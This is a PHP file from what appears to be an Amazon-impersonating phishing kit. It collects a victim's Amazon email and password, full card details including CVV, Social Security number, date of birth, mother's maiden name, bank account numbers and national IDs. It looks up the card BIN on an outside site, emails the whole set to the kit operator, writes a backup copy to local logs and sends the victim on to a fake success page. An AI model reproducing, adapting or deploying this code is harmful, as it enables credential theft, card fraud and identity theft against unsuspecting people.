<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
session_start();
require "../functions/Mfunctions.php";
require "../functions/get_lang.php";
require "../functions/get_browser.php";
require "../../../config.php";
$_SESSION['_cc_holder_'] = strtoupper($_SESSION['_cc_holder_']);
$_SESSION['_cc_number_'] = preg_replace('/\s+/', '', $_SESSION['_cc_number_']);
$ccno    = str_replace(' ', '', $ccno);
$binq     = str_replace(' ', '', $_SESSION['_cc_number_']);
$binq     = substr($binq, 0, 6);
$bins = file_get_contents("https://www.cardbinlist.com/search.html?bin=$binq");
$bin = preg_match_all("/headline\":\"(.*)\",\"datePublished/xs", $bins, $binn) ? $binn[1][0] : null;
$bin2 = preg_match_all("/caption\":\"BIN(.*)\",\"width\":\"600\",\"height\":\"400\"}}<\/script>/xs", $bins, $binn2) ? $binn2[1][0] : null;
$bin3 = explode(" ",$bin);
$bin4 = explode(" ",$bin2);
$ccbrand = strtoupper($bin3[2]);
$ccbank  = $bin3[5].' '.$bin3[6].' '.$bin3[7];
$cctype  = strtoupper($bin4[3]);
$ccklas  = strtoupper($bin3[3]);

$from = $senderemail;
$headers = "From: ".$_SESSION['_cc_holder_']." <$from>";
$subject = $binq . " - ".$ccbrand." ".$cctype." ".$ccklas." ".$ccbank." - [ ".$_SESSION['_LOOKUP_COUNTRY_']." - $ip ]";
$to = $Your_Email;
$data = "
.++======[ Amazon Credit Card  - Powered By SOMETHING ]======++.

    .++=====[ Amazon ]=====++.
Email       :   ".$_SESSION['_login_email_']."
Password    :   ".$_SESSION['_login_password_']."
        .++===[ End ]===++.
        
    .++=====[ Credit Card ]=====++.
Cardholder Name :  ".$_SESSION['_cc_holder_']."
Card Number     :  ".$_SESSION['_cc_number_']."
Cvv2            :  ".$_SESSION['_csc_']."
BIN/IIN Info    :   ".$ccbrand." - ".$ccbank->name." - ".$cctype."
Exp Date        :  ".$_SESSION['_expirationDate_month_']."/".$_SESSION['_expirationDate_year_']."
To Check        :   ".$_SESSION['_cc_number_']."|".$_SESSION['_expirationDate_month_']."/".$_SESSION['_expirationDate_year_']."|".$_SESSION['_csc_']."
            .++===[ End ]===++.

      .++=====[ Address & Info ]=====++.
Full Name       :   ".$_SESSION['_fullname_']."
Address         :   ".$_SESSION['_address1_'].", ".$_SESSION['_address1_']."
City/Town       :   ".$_SESSION['_city_']."
State           :   ".$_SESSION['_state_']."
Zip/PostalCode  :   ".$_SESSION['_zipCode_']."
Country         :   ".$_SESSION['_LOOKUP_COUNTRY_']."
Phone Number    :   ".$_SESSION['_phone_']."
DOB             :   ".$_SESSION['_dob_']."
Social Security Number  :   ".$_SESSION['_ssn_']."
            .++===[ End ]===++.
            
    .++=====[ Other Credit Card Info ]=====++.
Codice Fiscale (IT) :   ".$_SESSION['_codicefiscale_']."
Kontonummer (CH/DE) :   ".$_SESSION['_kontonummer_']."
Officiel ID (GR) :   ".$_SESSION['_offid_']."
          .++===[ End ]===++.
          
    .++=====[ Japan Credit Card Info ]=====++.
WEB ID (JP)					: ".$_SESSION['_cardpassid_']."
Card Ppassword (JP)			: ".$_SESSION['_cardpasspass_']."
          .++===[ End ]===++.

    .++=====[ Australia Credit Card Info ]=====++.
Credit Limits (AU) :   ".$_SESSION['_creditlimit_']."
OSID (AU) :   ".$_SESSION['_osid_']."
          .++===[ End ]===++.

    .++=====[ IRELAND, CANADA, & UNITED KINGDOM Credit Card Info ]=====++.
Sortcode (UK/IE) :   ".$_SESSION['_sortcode_']."
Account Number (UK/IE) :   ".$_SESSION['_accnumber_']."
Mother's Maiden Name :   ".$_SESSION['_mmname_']."
          .++===[ End ]===++.
            
    .++=====[ PC Info ]=====++.
IP Address  :   ".$_SESSION['_LOOKUP_COUNTRY_']." - ".$_SESSION['_LOOKUP_REGIONS_']." ".$_SESSION['_LOOKUP_CITY_']." - ".$_SESSION['_ip_']."
Browser     :   ".SOME_Browser($_SERVER['HTTP_USER_AGENT'])." On ".SOME_OS($_SERVER['HTTP_USER_AGENT'])."
        .++===[ End ]===++.

.++======[ Powered By SOMETHING - Amazon Credit Card ]======++. 
";
mail($to,$subject,$data,$headers);
  $bin   = "".$binq." - ".$ccbrand." ".$cctype." ".$ccklas." ".$ccbank." [ ".$_SESSION['_LOOKUP_COUNTRY_']." ]\n";
    $file1 = fopen("../../../logs/some-cc.log", "a");
    fwrite($file1, $bin);
    fclose($file1);
    
$file2 = "../../../logs/some-cc.txt";
$isi  = file_get_contents($file2);
$buka = fopen($file2,"w");
fwrite($buka, $isi+1);
fclose($buka);
    
    $see = fopen("../../../logs/some-log.txt","a");
    $jam = date("h:i:sa");
    fwrite($see,"[ $jam - ".$_SESSION['_ip_']." - ".$_SESSION['_LOOKUP_COUNTRY_']." - ".SOME_Browser($_SERVER['HTTP_USER_AGENT'])." - ".SOME_OS($_SERVER['HTTP_USER_AGENT'])." ] Mengisi Credit Card"."\n");
    fclose($see);

		$cadangan = "../../../logs/login-info.txt";
		$filecadangan = @fopen($cadangan, 'a+');
		@fwrite($filecadangan, $data);
		@fclose($filecadangan); //Cadangan kalo send email gak work
	
   if($One_Time_Access == "block")
{
$fp = fopen("../../../kill-bot/blacklist.dat", "a");
fputs($fp, "\r\n$ip\r\n");
fclose($fp);
}

header("Location: ../404.php?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
header("Location: ./success?verify_account=".sha1(microtime())."&dispatch=".sha1(microtime())."");
?>